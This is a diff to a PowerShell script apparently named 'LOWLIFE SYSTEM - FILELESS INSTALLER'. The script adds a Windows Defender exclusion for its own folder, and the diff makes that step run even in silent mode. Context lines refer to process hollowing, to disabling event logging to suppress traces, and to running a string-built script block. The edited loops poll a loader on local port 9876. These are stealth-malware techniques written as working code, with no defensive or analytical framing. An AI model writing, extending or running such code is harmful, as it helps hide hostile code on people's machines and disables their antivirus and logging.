@@ -63,25 +63,21 @@ Write-Host "   LOWLIFE SYSTEM - FILELESS INSTALLER    " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
     # Automatically add Windows Defender exclusion for workspace to prevent hollowing blockages
-    if (-not $Silent) {
-        Log-Msg "Configuring Windows Security exclusions..."
-        try {
-            if (-not [string]::IsNullOrWhiteSpace($resolvedPath)) {
-                $exclusionPath = Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue
-                if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
-                    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
-                    Log-Msg "    Workspace path successfully whitelisted in Windows Defender."
-                } else {
-                    Log-Msg "    WARNING: Workspace is at a root path; skipping Defender exclusion."
-                }
+    Log-Msg "Configuring Windows Security exclusions..."
+    try {
+        if (-not [string]::IsNullOrWhiteSpace($resolvedPath)) {
+            $exclusionPath = Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue
+            if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
+                Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
+                Log-Msg "    Workspace path successfully whitelisted in Windows Defender."
             } else {
-                Log-Msg "    WARNING: Script root path is empty; skipping Defender exclusion."
+                Log-Msg "    WARNING: Workspace is at a root path; skipping Defender exclusion."
             }
-        } catch {
-            Log-Msg "    WARNING: Could not automatically set Defender exclusions."
+        } else {
+            Log-Msg "    WARNING: Script root path is empty; skipping Defender exclusion."
         }
-    } else {
-        Log-Msg "Silent mode: skipping Windows Security exclusion configuration."
+    } catch {
+        Log-Msg "    WARNING: Could not automatically set Defender exclusions."
     }
 
     # Disable event logging during install to suppress traces
@@ -503,7 +499,7 @@ Log-Msg "Section 1 complete."
     if ($hollowSuccess) {
         Log-Msg "Waiting to verify initialization on port 9876..."
         # Check if port 9876 comes up
-        for ($i = 0; $i -lt 100; $i++) {
+        for ($i = 0; $i -lt 5; $i++) {
             try {
                 $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
                 $c.Close()
@@ -511,7 +507,8 @@ Log-Msg "Section 1 complete."
                 Log-Msg "Connection to 127.0.0.1:9876 succeeded!"
                 break
             } catch {
-                Start-Sleep -Milliseconds 50
+                Log-Msg "Connection to 127.0.0.1:9876 failed, retrying ($i)..."
+                Start-Sleep -Seconds 1
             }
         }
     }
@@ -628,13 +625,13 @@ if(`$s){. ([scriptblock]::Create(`$s)) -Silent -Key `$k;break}
     # -- Wait for loader to come up and open portal ---------------------------------
     Log-Msg "Waiting for loader to initialize on port 9876..."
     $started = $false
-    for ($i = 0; $i -lt 200; $i++) {
+    for ($i = 0; $i -lt 20; $i++) {
         try {
             $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
             $c.Close()
             $started = $true
             break
-        } catch { Start-Sleep -Milliseconds 50 }
+        } catch { Start-Sleep -Seconds 1 }
     }
 
     if ($started) {
